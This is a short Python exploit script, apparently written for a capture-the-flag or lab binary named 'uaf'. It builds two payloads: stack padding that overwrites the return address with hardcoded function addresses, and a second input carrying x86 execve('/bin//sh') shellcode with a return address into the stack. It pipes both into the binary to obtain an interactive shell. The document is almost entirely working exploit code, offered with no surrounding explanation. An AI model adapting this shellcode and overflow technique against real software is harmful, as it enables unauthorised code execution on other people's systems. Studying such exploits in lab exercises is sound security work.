import struct 
import os

secret = 0x804b410

free_memory = 0x804858b
check_password =0x8048652

p_eip =28

shellcode= "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

input_eip = 112
input_addr = 0xbffff1c8  #0xbffff128

atk_vector = "A"*p_eip
atk_vector += struct.pack("I", free_memory)
atk_vector += struct.pack("I", check_password)
atk_vector += struct.pack("I", secret)
atk_vector += struct.pack("I", secret)
atk_vector += '\n'

atk_vector2 = shellcode
atk_vector2 += '\0'
atk_vector2 += "A"*(input_eip-len(atk_vector2))
atk_vector2 += struct.pack("I", input_addr)
atk_vector2 += '\n'

f = open('fla1', 'w+')
f.write(atk_vector)

f = open('fla2', 'w+')
f.write(atk_vector2)
f.close()

os.system("(cat {}; cat {}; cat) | ./uaf".format('fla1', 'fla2'))







